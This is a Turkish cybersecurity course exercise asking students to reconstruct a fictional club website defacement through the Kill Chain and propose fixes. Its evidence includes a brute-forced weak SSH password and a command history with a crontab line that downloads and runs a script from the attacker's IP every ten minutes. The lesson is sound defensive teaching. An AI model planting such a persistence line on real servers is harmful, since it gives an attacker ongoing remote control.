---
id: m10-08
tur: uygulama
baslik: "Uygulama: Saldırının İzini Bul"
sure: 40
hedefler:
  - Kurgusal bir olayda saldırganın faydalandığı güvenlik eksiklerini bulmak
  - Olayın nasıl önlenebileceğini Kill Chain üzerinden tartışmak
gorseller:
  - id: m10-08-a
    tur: ai
    karakter: ferhat
    alt: "Kumdaki kırmızı ayak izleri açık bir sunucu dolabına, Fidyeci Ferhat'ın bıraktığı asma kilide uzanıyor"
    prompt: "A top-down view of a sandy path at night lit by a flashlight beam: a trail of glowing red footprints leads through a slightly open garden gate to a small server cabinet with its door ajar. The villain's back is visible as he hangs a heavy glowing padlock on the cabinet; small colored-dot markers sit beside each footprint."
---

# Uygulama: Saldırının İzini Bul

> **Olay:** Kurgusal Kuzey Kıyı Üniversitesi Siber Güvenlik Kulübü'nün etkinlik sitesi bir sabah
> "HACKED" yazısıyla açıldı. Ekibin topladığı kanıtlar aşağıda. Hepsi **kurgusaldır**.

![Kumdaki kırmızı ayak izleri açık bir sunucu dolabına, Fidyeci Ferhat'ın bıraktığı asma kilide uzanıyor](../../gorseller/m10-08-a.webp)

## Kanıtlar

**E1 — Kulüp sunucusu ayarları:** SSH 22 portu internete açık · parola ile giriş açık ·
`deploy` hesabının parolası `Kulup2024` (3 yıldır değişmemiş, kulübün başka bir sitesinde de aynı).

**E2 — `auth.log` özeti (M07):** 203.0.113.66'dan ~3 dakikada 58 başarısız deneme, ardından `deploy` için başarılı **parola** girişi.

**E3 — Komut geçmişi (`deploy`):**
```text
cd /var/www/etkinlik
cp index.html index.html.bak
echo "<h1>HACKED</h1>" > index.html
(crontab -l; echo "*/10 * * * * curl -s http://203.0.113.66/x.sh | bash") | crontab -
```

**E4 — İzleme:** Sunucuda başarısız giriş için hiçbir alarm kuralı yok; loglar haftada bir elle okunuyor.

## Görevler

1. **Zincir:** Olayı Kill Chain aşamalarına yerleştir. Hangi kanıt hangi aşamayı gösteriyor?
2. **Eksikler:** Saldırganın faydalandığı **en az 5** güvenlik eksiğini listele.
3. **Kırılma noktaları:** Her eksik için, zinciri o noktada kıracak **bir önlem** yaz.
4. **Kalıcılık:** E3'teki son satır ne yapıyor? Neden tehlikeli? Temizlik sırasında ne yapılmalı?
5. **Öncelik:** Önlemlerin arasından "yarın sabah ilk yapılacak 3 iş"i seç ve sırala.

<details><summary>Tartışma notları</summary>
Eksikler: internete açık SSH · parola girişi açık · zayıf ve tekrar kullanılan parola · hız sınırı/fail2ban yok · deploy hesabının web dosyalarına yazma yetkisi (en az yetki?) · izleme/alarm yok · çıkış trafiği kısıtlaması yok.
Kalıcılık: her 10 dakikada saldırganın sunucusundan betik indirip çalıştırıyor (komuta-kontrol). Temizlik: crontab'ı temizle, deploy parolasını değiştir ve anahtar tabanlı girişe geç, tüm oturumları kapat, sunucuda başka değişiklik var mı incele (mümkünse temiz kurulum), 203.0.113.66'yı engelle.
İlk 3 iş (örnek): 1) Erişimi kes ve kalıcılığı temizle 2) SSH'ta parola girişini kapat + parolayı değiştir 3) başarısız giriş alarmı ve hız sınırı.
</details>

## ✅ Akılda kalsın

- Olaylar genelde tek bir büyük hata değil, küçük eksiklerin zinciridir.
- Kalıcılığı temizlemeden yapılan "düzeltme" yarım kalır.
- İyi bir olay analizi önceliklendirilmiş önerilerle biter.
